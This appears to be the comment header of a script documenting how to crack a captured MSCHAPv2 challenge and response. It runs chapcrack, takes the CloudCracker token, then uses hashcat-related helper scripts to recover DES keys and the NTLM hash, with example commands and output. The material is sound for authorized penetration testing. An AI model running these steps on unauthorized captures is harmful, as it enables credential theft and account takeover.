#run chapchrack with the mschap challenge and response https://github.com/moxie0/chapcrack
#python2 chapcrack.py radius -C 44:80:58:11:a0:e2:09:4f -R c4:ef:da:98:b2:c1:4a:c2:f7:10:c9:4d:15:1e:9f:df:b0:31:f4:27:62:ec:31:ad
#
#results look like this
#Cracking K3........
#                     C1 = c4efda98b2c14ac2
#                     C2 = f710c94d151e9fdf
#                     C3 = b031f42762ec31ad
#                      P = 44805811a0e2094f
#                     K3 = 5f910000000000
#CloudCracker Submission = $99$RIBYEaDiCU/E79qYssFKwvcQyU0VHp/fX5E=
#
#copy the cloudcracker submission without the $99$
#https://hashcat.net/forum/thread-5912.html
#
#run chapcrack-des.sh
#chapcrack-des.sh RIBYEaDiCU/E79qYssFKwvcQyU0VHp/fX5E=
#
#DES-ntlm.sh
#
#des-to-ntlm.sh
